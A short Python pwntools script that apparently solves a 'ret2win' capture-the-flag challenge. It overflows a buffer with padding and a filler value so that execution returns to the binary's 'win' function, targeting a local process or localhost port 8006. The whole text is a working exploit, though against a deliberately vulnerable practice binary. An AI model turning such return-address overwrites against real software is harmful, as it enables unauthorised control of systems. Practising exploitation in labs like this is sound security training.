#!/usr/bin/env python3

from pwn import *

exe = ELF("./ret2win")

context.binary = exe

def conn():
    if args.LOCAL:
        p = process([exe.path])
        if args.GDB:
            gdb.attach(p)
            pause()
    else:
        p = remote("localhost", 8006)

    return p


def main():
    p = conn()

    # good luck pwning :)
    payload = flat(
        b"a"*0x10,
        0xdeadbeef,
        exe.sym.win,
    )
    p.sendline(payload)

    p.interactive()


if __name__ == "__main__":
    main()
